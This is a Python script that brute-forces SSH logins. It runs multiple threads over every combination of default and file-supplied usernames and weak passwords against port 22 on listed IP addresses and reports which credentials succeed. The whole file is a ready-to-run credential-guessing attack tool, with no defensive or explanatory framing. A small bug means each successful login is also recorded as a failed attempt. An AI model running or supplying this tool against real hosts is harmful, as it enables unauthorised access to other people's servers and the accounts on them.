import paramiko
import threading
import queue
import time
import os

# Global configuration
rate_limit_delay = 1  # Seconds between attempts per thread
max_threads = 5  # Number of concurrent threads per IP

def load_credentials(file_path, default_list):
    """Load credentials from a file or return the default list."""
    if os.path.exists(file_path):
        print(f"[+] Loading credentials from {file_path}")
        with open(file_path, 'r') as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    else:
        print(f"[-] File {file_path} not found. Using default list.")
        return default_list

def attempt_ssh_login(host, port, username, password, result_queue):
    """Attempt to login to SSH with given credentials."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port, username, password, timeout=5)
        print(f"[+] Login successful: {username}@{host}:{port} with password '{password}'")
        result_queue.put((host, username, password, True))
    except paramiko.AuthenticationException:
        print(f"[-] Login failed for {username}@{host}:{port} with password '{password}'")
    except Exception as e:
        print(f"[!] Error on {host}: {e}")
    finally:
        client.close()
    result_queue.put((host, username, password, False))

def worker(host, port, credentials_queue, result_queue):
    """Worker thread for processing login attempts."""
    while not credentials_queue.empty():
        username, password = credentials_queue.get()
        attempt_ssh_login(host, port, username, password, result_queue)
        time.sleep(rate_limit_delay)

def main():
    # File paths
    usernames_file = "usernames.txt"
    passwords_file = "passwords.txt"

    # Load usernames and passwords
    default_usernames = ["admin", "root", "user", "guest", "test", "support", "administrator", "webadmin"]
    default_passwords = ["password", "123456", "admin", "letmein", "qwerty", "welcome", "password123", "root"]

    usernames = load_credentials(usernames_file, default_usernames)
    passwords = load_credentials(passwords_file, default_passwords)

    # Target configuration
    target_ips = [
        "192.168.1.100",  # Add more IPs as needed
        "192.168.1.101",
        "192.168.1.102"
    ]
    port = 22

    for host in target_ips:
        print(f"[*] Starting brute-force SSH attack on {host}:{port}")
        
        # Build a queue of credentials
        credentials_queue = queue.Queue()
        for username in usernames:
            for password in passwords:
                credentials_queue.put((username, password))

        # Result queue for storing outcomes
        result_queue = queue.Queue()

        # Create worker threads
        threads = []
        for _ in range(min(max_threads, credentials_queue.qsize())):
            thread = threading.Thread(target=worker, args=(host, port, credentials_queue, result_queue))
            thread.start()
            threads.append(thread)

        # Wait for all threads to complete
        for thread in threads:
            thread.join()

        # Process results
        print(f"[*] Results for {host}:")
        while not result_queue.empty():
            ip, username, password, success = result_queue.get()
            if success:
                print(f"    [+] Successful login: {username}:{password} on {ip}")
            else:
                print(f"    [-] Failed attempt: {username}:{password} on {ip}")

if __name__ == "__main__":
    main()
